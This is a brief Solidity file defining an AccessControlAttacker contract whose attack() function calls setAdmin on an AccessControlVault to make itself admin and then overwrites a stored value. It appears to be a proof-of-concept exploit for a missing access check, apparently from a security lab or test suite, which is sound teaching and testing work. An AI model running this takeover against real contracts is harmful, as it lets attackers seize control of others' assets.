// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./AccessControlVault.sol";

contract AccessControlAttacker {
    AccessControlVault public vault;

    constructor(AccessControlVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.setAdmin(address(this));
        vault.setValue(999);
    }
}
